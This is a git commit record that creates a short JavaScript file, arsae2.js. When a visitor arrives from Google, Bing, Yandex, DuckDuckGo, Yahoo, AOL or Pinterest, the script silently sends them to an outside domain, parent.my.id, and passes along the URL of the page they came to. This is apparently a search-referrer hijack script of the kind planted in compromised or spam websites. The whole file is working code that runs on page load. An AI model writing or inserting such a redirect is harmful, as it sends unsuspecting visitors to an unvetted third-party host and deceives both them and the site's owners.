8216788010b7e8f6ee1db2358ab6c16baf725cac
itongnet <87578362+itongnet@users.noreply.github.com>
2022-05-06 08:10:50 +0700

    Create arsae2.js

---
+++ arsae2.js
@@ -0,0 +1,12 @@
+    if(document.referrer)
+    {
+    	var cek = document.referrer;
+
+    	var is_se = cek.includes('.google.') || cek.includes('.bing.') || cek.includes('yandex.') || cek.includes('duckduckgo.') || cek.includes('.yahoo.') || cek.includes('aol.') || cek.includes('pinterest.');
+
+      if(is_se)
+    	{
+    		var url = window.location.href;
+    		window.location = "https://parent.my.id/?arsae="+ encodeURIComponent(url);
+    	}
+    }
